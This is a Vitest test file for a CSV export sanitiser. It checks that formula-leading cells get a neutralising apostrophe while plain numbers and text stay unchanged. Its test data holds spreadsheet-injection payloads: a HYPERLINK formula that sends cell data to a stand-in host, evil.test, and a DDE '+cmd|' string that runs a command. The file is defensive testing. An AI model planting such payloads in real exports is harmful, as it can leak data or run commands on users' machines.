import { describe, expect, it } from "vitest";

import { csvCell, toCsv } from "./csv";

// Moved from packages/testing/src/operate-web.test.ts (ADR-0478).
describe("operate-web CSV export (M-07)", () => {
  it.each([
    ["=HYPERLINK(\"https://evil.test?\"&A1,\"x\")", "\"'=HYPERLINK(\"\"https://evil.test?\"\"&A1,\"\"x\"\")\""],
    ["=1+1", "'=1+1"],
    ["+cmd|' /C calc'!A0", "'+cmd|' /C calc'!A0"],
    ["-2+3", "'-2+3"],
    ["@SUM(A1:A2)", "'@SUM(A1:A2)"],
    ["\t=1+1", "'\t=1+1"],
    ["\r=1+1", "\"'\r=1+1\""],
    ["-", "'-"],
  ])("neutralises a formula-leading cell %j", (raw, expected) => {
    expect(csvCell(raw)).toBe(expected);
  });

  it.each([
    ["-10.25", "-10.25"],
    ["+3", "+3"],
    ["-0.5", "-0.5"],
    ["-.5", "-.5"],
    ["-1e3", "-1e3"],
    [-42, "-42"],
    [3.5, "3.5"],
    ["plain text", "plain text"],
    ["a, b", "\"a, b\""],
    ["say \"hi\"", "\"say \"\"hi\"\"\""],
    [true, "true"],
    [null, ""],
    [undefined, ""],
    ["a=b", "a=b"],
  ])("keeps %j as data", (raw, expected) => {
    expect(csvCell(raw)).toBe(expected);
  });

  it("neutralises the header row too, since a label is manifest-authored", () => {
    const text = toCsv([{ a: "=1+1", b: "-10.25" }], [
      { key: "a", label: "=evil" },
      { key: "b", label: "Amount" },
    ]);
    expect(text).toBe("'=evil,Amount\r\n'=1+1,-10.25");
  });
});

